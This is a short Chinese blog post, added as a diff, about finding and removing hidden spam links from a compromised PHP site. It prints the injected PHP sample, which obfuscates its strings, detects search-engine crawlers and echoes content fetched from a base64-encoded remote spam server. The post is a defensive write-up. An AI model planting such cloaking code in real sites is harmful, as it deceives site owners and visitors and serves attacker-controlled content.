@@ -1,0 +1,26 @@
+---
+layout: post
+title: '清理站长工具垃圾友情链接的一种方法'
+date: 2011-3-15
+wordpress_id: 465
+permalink: /blogs/465
+comments: true
+---
+描述：利用站长工具查询友情链接（<a href="http://link.chinaz.com/">http://link.chinaz.com/</a>），发现有很多垃圾链，查看HTML源代码，数据库，程序文件都未发现相关垃圾链接，并且垃圾链接可能在逐步增加，程序环境为php
+
+解决方案：可能被加了暗链，需要仔细检查程序文件，发现某些php文件可能含有类似以下代码
+[php]
+&lt;?php
+error_reporting(E_ERROR);
+$spideragents = strtolower($_SERVER['H'.'T'.'T'.'P_U'.'S'.'E'.'R_A'.'G'.'E'.'N'.'T']);
+$spidereregis = base64_decode('YmFpZHV8Z29vZ2xlfHNvc298c29nb3U=');
+if(eregi($spidereregis,$spideragents))
+{
+	echo file_get_contents(base64_decode('aHR0cDovL3Nlby5tc3NzbS5jb206NTQzMjMvbGluay9zZW8ucGhw'));
+}
+?&gt;
+[/php]
+
+将以上代码清楚掉之后问题解决。
+
+以后遇到此文件，可以根据以上示例检索相关内容，比如file_get_contents 方法
